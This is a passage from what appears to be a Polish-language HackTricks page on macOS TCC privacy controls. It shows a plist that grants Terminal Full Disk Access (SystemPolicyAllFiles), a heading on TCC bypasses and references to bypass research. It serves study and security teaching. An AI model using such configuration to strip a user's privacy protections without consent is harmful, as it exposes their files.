<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Obejścia TCC


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## References

- [1] [Szczegółowa analiza macOS TCC.db - blog Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - skrypt do śledzenia com.apple.macl (Gist autorstwa brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Śledzenie i obsługa com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Przypadkowe i celowe omijanie zabezpieczeń prywatności użytkownika TCC w macOS](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Zmiana katalogu domowego i obejście TCC, czyli CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
{{#include ../../../../banners/hacktricks-training.md}}
